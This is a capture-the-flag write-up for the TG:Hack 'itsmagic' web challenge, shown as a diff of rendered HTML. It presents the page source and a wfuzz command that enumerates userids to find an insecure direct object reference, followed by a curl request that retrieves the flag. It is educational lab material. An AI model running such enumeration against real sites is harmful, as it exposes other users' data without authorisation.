@@ -1,0 +1,129 @@
+I"}-<h2><img src="./screenshots/itsmagic.png" alt="itsmagic (100 pts)" /></h2>
+<h2 id="challenge-info">CHALLENGE INFO</h2>
+<ul>
+  <li><strong>CHALLENGE LINK</strong>: https://wandshop.tghack.no/</li>
+  <li>
+    <p><strong>LANDING PAGE</strong>:</p>
+
+    <p><img src="./screenshots/itsmagic_home.png" alt="homepage" /></p>
+
+    <ul>
+      <li><strong>Page Source</strong>:
+        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+
+<span class="nt">&lt;head&gt;</span>
+  <span class="nt">&lt;title&gt;</span>itsmagic<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"script.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"style.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"init()"</span> <span class="na">class=</span><span class="s">"orangebackground"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;header&gt;</span>
+    <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"logo"</span> <span class="na">src=</span><span class="s">"/pictures/itsmagic_2.png"</span> <span class="na">alt=</span><span class="s">"itsmagic logo"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;/header&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-page"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"login-form"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"username"</span> <span class="na">placeholder=</span><span class="s">"username"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">id=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"password"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">id=</span><span class="s">"myBtn"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="na">onclick=</span><span class="s">"login()"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"homecontainer"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/pictures/orange_itsmagic.jpg"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>        </div>
+      </li>
+      <li><strong><em>/script.js</em></strong>
+        <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">rooturl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span><span class="o">+</span><span class="dl">"</span><span class="s2">//</span><span class="dl">"</span><span class="o">+</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="o">+</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Nothing interesting here, just trying to make task seem like </span>
+    <span class="c1">// it has a real login page in a hacky way</span>
+    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">username</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+
+    <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">rooturl</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">login/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">username</span><span class="p">);</span>
+
+    <span class="nx">request</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">userid</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span> <span class="o">&amp;&amp;</span> <span class="nx">userid</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
+            <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">rooturl</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">home/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">userid</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">home</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Just selecting grades randomly to illustrate that each user </span>
+    <span class="c1">// has their own grades (giving the feel of a real website)</span>
+
+    <span class="p">...</span>
+
+    <span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+
+</code></pre></div>        </div>
+        <p><strong>Notes</strong>:</p>
+        <ul>
+          <li>The <strong>login form</strong> is bogus</li>
+          <li>The grades generated after “logging in” is randomly generated</li>
+          <li>The default <strong>userid</strong> after “logging in” is 1338</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>ASSUMED OBJECTIVE</strong>: Find the <strong>userid</strong> where the flag is hidden</li>
+</ul>
+
+<hr />
+
+<h2 id="step-1--find-the-userid-with-the-flag">Step 1 : Find the <strong>userid</strong> with the flag</h2>
+
+<ol>
+  <li>Run <strong><em>wfuzz</em></strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wfuzz -z range,0-9999 https://itsmagic.tghack.no/home/FUZZ
+
+</span><span class="gp">#</span><span class="w"> </span><span class="o">==================================================================</span>
+<span class="gp">#</span><span class="w"> </span>ID   Response   Lines      Word         Chars          Payload
+<span class="gp">#</span><span class="w"> </span><span class="o">==================================================================</span>
+<span class="gp">#</span><span class="w"> </span>...
+<span class="gp">#</span><span class="w"> </span>001330:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1329"</span>
+<span class="gp">#</span><span class="w"> </span>001332:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1331"</span>
+<span class="gp">#</span><span class="w"> </span>001334:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1333"</span>
+<span class="gp">#</span><span class="w"> </span>001333:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1332"</span>
+<span class="gp">#</span><span class="w"> </span>001335:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1334"</span>
+<span class="gp">#</span><span class="w"> </span>001337:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1336"</span>
+<span class="gp">#</span><span class="w"> </span>001336:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1335"</span>
+<span class="gp">#</span><span class="w"> </span>001338:  <span class="nv">C</span><span class="o">=</span>200      0 L       10 W           76 Ch    <span class="s2">"1337"</span>
+<span class="gp">#</span><span class="w"> </span>001339:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1338"</span>
+<span class="gp">#</span><span class="w"> </span>001340:  <span class="nv">C</span><span class="o">=</span>200     43 L       74 W          936 Ch    <span class="s2">"1339"</span>
+<span class="gp">#</span><span class="w"> </span>...
+</code></pre></div>    </div>
+    <p><strong>Note</strong>:</p>
+    <ul>
+      <li><strong>userid 1337</strong> has a different content length than the rest.</li>
+    </ul>
+  </li>
+  <li>Check <strong>userid 1337</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">curl https://itsmagic.tghack.no/home/1337
+</span></code></pre></div>    </div>
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Congrats, y0ur s0 1337! <span class="nt">&lt;/br&gt;</span>TG19{Direct object reference might B insecure!}
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="flag--tg19direct-object-reference-might-b-insecure">FLAG : <strong>TG19{Direct object reference might B insecure!}</strong></h2>
+:ET
